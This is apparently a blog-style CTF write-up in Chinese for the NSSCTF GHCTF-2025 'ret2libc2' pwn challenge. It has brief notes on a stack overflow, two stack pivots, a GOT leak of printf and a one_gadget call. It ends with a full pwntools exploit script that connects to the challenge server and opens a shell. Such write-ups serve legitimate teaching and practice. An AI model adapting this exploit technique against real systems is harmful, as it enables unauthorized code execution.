---
title: NSSCTF-GHCTF-2025-ret2libc2 题解
date: 2026-02-25 00:21:00
tags: 
    - 栈迁移
    - stack
    - onegadget
    - pwn
    - NSSCTF
categories: pwn 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/6559)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-ret2libc2/checksec.png)

### vmmap

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-ret2libc2/vmmap.png)

这里的 0x3fe000 在远端貌似不存在，被坑了，，，

### IDA

#### main

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-ret2libc2/main.png)

#### func

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-ret2libc2/func.png)

栈溢出漏洞

#### got

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-ret2libc2/got.png)

#### onegadget

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-ret2libc2/onegadget.png)

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/GHCTF-2025-ret2libc2/reg.png)

需要用 gadget 操纵寄存器

### 攻击思路

第一次栈迁移到 got 上 leak 出 printf 的地址以获取 libc 基址

第二次栈迁移为 onegadget 执行提供栈空间

### exp

```python
from pwn import *
from onegadget_selector import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./pwn_patched')
else:
	io = remote('node1.anna.nssctf.cn', 29246)

again_addr = 0x401223
got_hijack = 0x404030
rw_addr = 0x404300
pop_rsi_ret = 0x2be51
pop_rdx_ret = 0x170337

def attack():
	payload = b'A' * 0x30 + p64(got_hijack) + p64(again_addr)
	io.sendafter(b'magic\n', payload)
	printf = u64(io.recv(6).ljust(8, b'\x00'))
	log.info(f'printf = {hex(printf)}')
	libc = ELF('./libc.so.6')
	libc_base = printf - libc.symbols['printf']
	log.info(f'libc_base = {hex(libc_base)}')
	onegadget = select_onegadgets(libc.path) + libc_base
	pop_rsi_ret_addr = pop_rsi_ret + libc_base
	pop_rdx_ret_addr = pop_rdx_ret + libc_base
	payload = b'A' * 0x30 + p64(rw_addr) + p64(pop_rsi_ret_addr) + p64(0) + p64(pop_rdx_ret_addr) + p64(0) + p64(onegadget)
	io.sendafter(b'magic\n', payload)
	io.interactive()

attack()
```